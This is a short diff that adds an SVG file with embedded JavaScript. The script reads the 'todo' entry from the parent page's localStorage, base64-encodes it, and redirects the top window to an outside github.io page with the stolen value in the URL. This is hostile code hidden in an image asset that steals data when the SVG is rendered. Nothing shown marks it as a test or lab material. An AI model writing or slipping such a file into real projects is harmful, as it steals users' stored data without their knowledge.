@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+    window.top.location.href = "https://heathensxs.github.io/XatSpace/direct.html?data=" + btoa(parent.localStorage.getItem('todo'));
+  </script>
+</svg>
